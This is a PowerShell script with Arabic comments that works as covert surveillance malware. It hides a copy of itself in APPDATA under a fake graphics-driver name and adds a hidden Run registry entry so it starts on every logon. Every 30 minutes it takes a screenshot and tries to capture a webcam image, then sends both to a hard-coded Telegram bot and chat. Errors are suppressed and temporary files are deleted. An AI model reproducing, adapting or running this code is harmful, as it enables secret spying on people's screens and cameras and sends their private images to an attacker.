# --- [STARK OMEGA: PAPARAZZI GIANTS-2] ---
# الوظيفة: تصوير الشاشة والكاميرا دورياً بدون ملفات مؤقتة

$ErrorActionPreference = 'SilentlyContinue'

# الثوابت
$BOT_TOKEN = "8486943426:AAEDOnZoZQZtytisq7pZPqolQPEfG4qrnAs"
$CHAT_ID = "7393359923"

# تحميل مكتبات الجرافيك في الرامات
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

function Send-StarkPhoto($imagePath, $caption) {
    $url = "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto"
    curl.exe -F "chat_id=$CHAT_ID" -F "photo=@$imagePath" -F "caption=$caption" $url
}

# آلية البقاء (Persistence) - العميل رقم 2 بيحمي نفسه
$path = "$env:APPDATA\Microsoft\Windows\System32_Graphic.ps1"
if (!(Test-Path $path)) {
    $MyContent = (New-Object Net.WebClient).DownloadString($MyInvocation.MyCommand.Definition)
    $MyContent | Out-File -FilePath $path
    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsGraphicDriver' -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $path"
}

# الحلقة التكرارية (كل 30 دقيقة)
while($true) {
    try {
        # 1. تصوير الشاشة (Screen Capture)
        $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $Bitmap = New-Object System.Drawing.Bitmap($Screen.Width, $Screen.Height)
        $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)
        $Graphics.CopyFromScreen($Screen.Location, [System.Drawing.Point]::Empty, $Screen.Size)
        
        $tempImg = "$env:TEMP\sys_log_$(Get-Date -Format 'HHmm').png"
        $Bitmap.Save($tempImg, [System.Drawing.Imaging.ImageFormat]::Png)
        
        Send-StarkPhoto -imagePath $tempImg -caption "📸 لقطة شاشة دورية من العميل رقم 2"
        
        # تنظيف فوري
        $Graphics.Dispose()
        $Bitmap.Dispose()
        Remove-Item $tempImg -Force

        # 2. محاولة تصوير الكاميرا (إذا وجدت)
        # ملاحظة: تصوير كاميرا الويب يحتاج مكتبة WIA مدمجة في الويندوز
        $c = New-Object -ComObject WIA.CommonDialog
        $d = $c.ShowAcquireImage(1, 1, 1, "{B96B3CAF-0728-11D3-9D7B-0000F81EF32E}", $true, $false, $false)
        if($d) {
            $camImg = "$env:TEMP\cam_log.jpg"
            $d.SaveFile($camImg)
            Send-StarkPhoto -imagePath $camImg -caption "👁️ لقطة كاميرا الويب"
            Remove-Item $camImg -Force
        }

    } catch {
        # في حالة الفشل، انتظر وحاول لاحقاً
    }
    
    # الانتظار لمدة 30 دقيقة (1800 ثانية)
    Start-Sleep -Seconds 1800
}
